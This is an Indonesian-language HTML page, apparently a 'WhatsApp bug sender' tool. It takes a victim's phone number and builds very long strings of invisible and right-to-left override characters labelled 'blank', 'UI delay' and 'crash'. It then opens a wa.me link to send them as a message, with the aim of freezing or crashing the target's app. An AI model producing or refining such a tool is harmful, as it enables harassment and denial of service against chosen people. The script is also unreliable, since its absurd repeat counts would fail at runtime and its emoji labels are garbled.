<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Bug WhatsApp Sender</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 30px; }
    textarea, input { width: 300px; margin: 10px; }
    button { padding: 10px 20px; font-size: 16px; }
  </style>
</head>
<body>
  <h2>Bug WhatsApp Sender</h2>
  <input id="nomor" placeholder="Masukkan nomor (628xxxx)" /><br>

  <select id="jenis">
    <option value="blank">ğŸ•³ï¸ Blank Text</option>
    <option value="ui">ğŸ¢ UI Delay</option>
    <option value="crash">ğŸ’¥ Crash Ringan</option>
  </select><br>

  <button onclick="kirim()">KIRIM SEKARANG</button>

  <script>
    function getBug(type) {
      let bug1 = "\u2063".repeat(5000);
      let bug2 = "\u200F\u202E\u2063\u3164".repeat(9999999999999);
      let bug3 = "\u202E\u202E\u202E\u202E\u202E".repeat(999999999999) + "ğŸ”’".repeat(999999999);

      if (type === "blank") return bug1;
      if (type === "ui") return bug2;
      if (type === "crash") return bug3;
    }

    function kirim() {
      let nomor = document.getElementById("nomor").value;
      let jenis = document.getElementById("jenis").value;
      let bug = encodeURIComponent(getBug(jenis));

      if (!nomor.startsWith("62")) {
        alert("Gunakan format nomor 62...");
        return;
      }

      window.open(`https://wa.me/${nomor}?text=${bug}`, "_blank");
    }
  </script>
</body>
</html>
